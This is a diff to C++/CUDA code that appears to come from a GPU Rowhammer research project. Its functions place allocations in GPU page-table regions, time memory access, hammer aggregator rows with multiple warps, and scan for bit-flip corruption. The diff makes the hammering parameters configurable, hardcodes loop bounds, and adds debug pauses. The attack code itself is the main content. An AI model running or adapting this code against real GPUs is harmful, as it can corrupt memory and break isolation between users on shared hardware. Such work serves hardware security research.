@@ -22,7 +22,7 @@ first_PT_region_attack_test (int argc, char *argv[])
 
   uint8_t *temp;
   GPUBreachContext ctx;
-
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
   if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: First PT Region Allocation is wrong\n");
@@ -37,7 +37,7 @@ first_PT_region_attack_test (int argc, char *argv[])
 
   int consec_spike = 0;
   int consec_spike_lim = 5;
-  for (uint64_t i = 0; i < num_alloc_init; i += 1)
+  for (uint64_t i = 0; i < 47L * 1024 * 1024 * 1024; i += 1)
     {
       cudaMallocManaged (&temp, ALLOC_SIZE);
       double currentMS = time_data_access (temp, ALLOC_SIZE);
@@ -116,10 +116,10 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
     {
       // On Failure, Re-order and try again
       if (repeats != 0)
-        std::rotate (region_ptrs.begin(), region_ptrs.begin() + num_alloc_post_msg - 8,
+        std::rotate (region_ptrs.begin(), region_ptrs.begin() + num_alloc_post_msg - 32,
                      region_ptrs.begin() + num_alloc_post_msg);
         // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
-      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+      for (uint64_t i = 0; i < 8000; i += 1)
         {
           if (repeats != 0)
             cudaFree (region_ptrs[i]);
@@ -134,7 +134,8 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
           if (i < 8000)
             *region_ptrs[i] = 'a';
         }
-
+      paused();
+      std::cout << "donr" << '\n';
       gpuErrchk (cudaPeekAtLastError ());
       std::cout << "First PT Region Filled " << "Round " << repeats
                 << " Completed" << '\n';
@@ -146,17 +147,19 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
       std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';
 
-      const uint64_t it = 23000;
-      const uint64_t n = 8;
-      const uint64_t k = 3;
-      const uint64_t delay = 55;
-      const uint64_t period = 1;
+      const uint64_t it = ctx.bitflip_config.it;
+      const uint64_t n = ctx.bitflip_config.n;
+      const uint64_t k = ctx.bitflip_config.k;
+      const uint64_t delay = ctx.bitflip_config.delay;
+      const uint64_t period = ctx.bitflip_config.period;
+      const uint64_t repeat = ctx.bitflip_config.repeat;
 
-      for (int j = 0; j < 50; j++)
+      for (int j = 0; j < repeat; j++)
         uint64_t time = start_multi_warp_hammer (
             agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
 
       std::cout << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking longer than 5s, CTRL + C and stop the program)\033[0m" << '\n';
+      paused();
       /**
        * For each 64KB, read from cuda. (Change util to write different data to
        * 64KB offset) Find repetition for temp and pair.
@@ -242,7 +245,7 @@ first_PT_region_attack (int argc, char *argv[])
   const double threshold = std::stod (argv[2]);
   const uint64_t skip = std::stoull (argv[3]);
   GPUBreachContext ctx;
-
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[4]);
   return first_PT_region_attack (
       num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
 }
